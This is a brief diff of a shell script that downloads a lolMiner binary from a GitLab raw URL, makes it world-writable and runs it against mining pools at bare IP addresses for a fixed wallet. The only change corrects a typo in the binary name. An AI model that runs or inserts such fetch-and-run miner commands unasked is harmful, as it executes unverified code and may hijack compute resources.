@@ -12,6 +12,6 @@ chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.12.20:80 -u 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lolMiner1.82a
 chmod 777 lolMiner1.82a
 
-./llolMiner1.82a --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qrdgwjq2mydwswum0rkdlxgnyelamst53wxcj3dlc3z9jhx67745kmfzjk0rz.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
+./lolMiner1.82a --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qrdgwjq2mydwswum0rkdlxgnyelamst53wxcj3dlc3z9jhx67745kmfzjk0rz.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
 
 done
